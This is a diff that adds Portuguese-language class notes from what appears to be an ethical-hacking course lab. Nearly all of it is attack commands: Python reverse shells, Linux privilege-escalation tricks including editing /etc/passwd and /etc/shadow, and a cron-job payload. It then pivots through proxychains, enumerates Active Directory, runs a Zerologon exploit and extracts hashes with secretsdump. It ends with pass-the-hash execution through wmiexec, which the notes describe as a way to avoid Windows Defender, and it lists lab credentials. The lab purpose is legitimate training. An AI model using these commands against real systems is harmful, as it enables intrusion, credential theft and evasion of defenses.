@@ -8418,6 +8418,224 @@ Código console.py abaixo
 	            raise ConnectionError("Conexão encerrada durante a recepção")
 	        return dados
 
+
+## EHTF Thiago Muniz
+
+		AULA 02 EHTF
+		
+		Credenciais da máquina de escalação de privilégios
+		debian:debian
+		pedro:password
+		joao:secret
+		
+		
+		ALVO 1: 192.168.161.25
+		
+		
+		VIMOS TAMBÉM EXPLORAÇÃO VIA FTP ANÔNIMO NA PORTA 8080 E RSYNC
+		
+		
+		https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution
+		
+		REVSHELL PYTHON3
+		
+		python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.161.20",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+		
+		
+		
+		hostname
+		
+		sudo -l
+		
+		hostnamectl
+		
+		lsb_release -a 
+		
+		sudo --version
+		
+		uname -a
+		
+		ps -U root -u root u # PROCESSOS RODANDO COMO ROOT
+		
+		cat /etc/hosts
+		
+		ip addr
+		
+		netstat -tulpn | grep LISTEN
+		
+		cat /etc/passwd
+		ls /etc/passwd -l
+		ls /etc/shadow -l
+		
+		env
+		
+		ARQUIVO PERMISSÃO DE ESCRITA
+		find /etc -perm -2 -type f 2>/dev/null
+		
+		
+		SUID
+		find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+		find / -perm -u=s -type f 2>/dev/null
+		find / -perm -u=s -type f 2>&-
+		
+		
+		
+		cat /etc/crontab
+		
+		
+		
+		- BIT SUID
+		
+		find / -perm -u=s -type f 2>&-
+		
+		/usr/bin/time /bin/sh -p
+		
+		bash -p
+		
+		find . -exec /bin/sh -p \; -quit
+		
+		bash -p
+		
+		cat /root/proof.txt
+		
+		
+		- PASSWD
+		openssl passwd thiago
+		Criar entrada com outro nome, e muda o uid e sid
+		thiagopriv:UCn9PWDseQCVI:0:0:,,,:/home/thiago:/bin/bash
+		
+		- SHADOW
+		openssl passwd thiago
+		root:!:19254:0:99999:7::: # ONDE TEM ! coloca a senha gerado
+		root:UCn9PWDseQCVI:19254:0:99999:7:::
+		su root
+		
+		
+		
+		
+		- SUDO
+		su Pedro
+		
+		sudo -l
+		
+		sudo man man
+		!/bin/sh
+		
+		sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+		
+		
+		
+		- CAPABILITIES
+		getcap
+		/usr/sbin/getcap -r /usr/
+		python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+		
+		
+		
+		- PATH
+		magicbinary
+		cd /tmp
+		echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls
+		export PATH=/tmp:$PATH
+		echo $PATH
+		
+		- DOCKER
+		docker run -it --rm -v /:/mnt bash
+		cat /mnt/root/proof.txt
+		
+		
+		- PRIVESC CRONTAB - precisa criar o arquivo /opt/security como root com permissão total
+		
+		cat /etc/crontab
+		
+		/opt/security.py
+		
+		ls -l /opt/security.py
+		
+		nano /opt/security.py # comenta o arquivo e adiciona o payload abaixo:
+		
+		import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.86",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+		
+		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+		
+		
+		MOSTRAR LINPEAS
+		MOSTRAR LESS
+		MOSTRAR LINENUM
+		
+		
+		ssh thiagopriv@192.168.161.25 -D 4321 -fN
+		vim /etc/proxychains4.conf
+		
+		ALVO 2: 172.16.16.16
+		proxychains -q nmap 172.16.16.16
+		proxychains -q nmap -sT 172.16.16.16
+		proxychains -q nmap -sT 172.16.16.16 -Pn
+		
+		proxychains netexec smb 172.16.16.16
+		
+		#Host 172.16.16.16 tem o LDAP rodando, sinal de que é um AD, mostra 
+		
+		ENUMERAÇÃO LDAP
+		proxychains nmap -Pn -v -n -p 389 172.16.16.16 --script ldap-rootdse # obter informação sobre esquema do AD
+		proxychains nmap -Pn -v -n -p 389 172.16.16.16 --script "ldap* and not brute"
+		
+		
+		ENUMERAÇÃO DNS
+		proxychains dig axfr xtr.local @172.16.16.16
+		
+		
+		
+		proxychains nmblookup -A 172.16.16.16
+		proxychains  nbtscan 172.16.16.16
+		proxychains  nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 172.16.16.16
+		
+		
+		netexec smb 172.16.16.16 --shares
+		netexec smb 172.16.16.16 --users
+		netexec smb 172.16.16.16 --pass-pol
+		
+		PROCURAR POR VULNERABILIDADES
+		netexec smb 172.16.16.16 -L
+		netexec smb 172.16.16.16 -M spooler
+		netexec smb 172.16.16.16 -M ms17-010
+		netexec smb 172.16.16.16 -M zerologon
+		
+		
+		impacket-psexec # Faz upload de um binário no alvo e se o alvo estiver com proteção será alertado e bloqueado
+		
+		ZERO LOGON SCRIPTS (https://github.com/dirkjanm/CVE-2020-1472.git)
+		git clone https://github.com/dirkjanm/CVE-2020-1472.git
+		cd CVE-2020-1472
+		proxychains -q python3 ex.py dc 172.16.16.16
+		
+		
+		EXTRAIR HASHES
+		proxychains impacket-secretsdump -just-dc xtr/dc\$@172.16.16.16 # $ pq é sem senha
+		
+		proxychains  netexec smb 172.16.16.16 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c' --shares
+		proxychains netexec smb 172.16.16.16 -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' --users
+		proxychains netexec smb 172.16.16.16  -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' --pass-pol
+		
+		proxychains netexec smb 172.16.16.16  -u administrator -H 'f07696198910eb5aff8e92517ae6c46c' -x whoami
+		
+		Pode fazer a pratica com psexec, mas nesse momento sem desabilitar a proteção vai ser detectado pelo defender
+		proxychains impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16
+		
+		EXECUTAR COMANDOS NO SERVIDOR AD UTILIZANDO WMI PARA O WINDOWS DEFENDER NÃO PEGAR 
+		proxychains impacket-wmiexec -hashes "hash_administrator" "dominio/usuario"@ip comando
+		proxychains impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 hostname
+		proxychains impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 "sc query WinDefend" # Identificar se o Defender está habilitado
+		
+		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'where /r c: proof*'   
+		
+		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'dir /s  proof*'   
+		
+		
+		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'type users\administrator\desktop\proof.txt.txt'
+
+
+
 TO BE CONTINUED
 .
 .
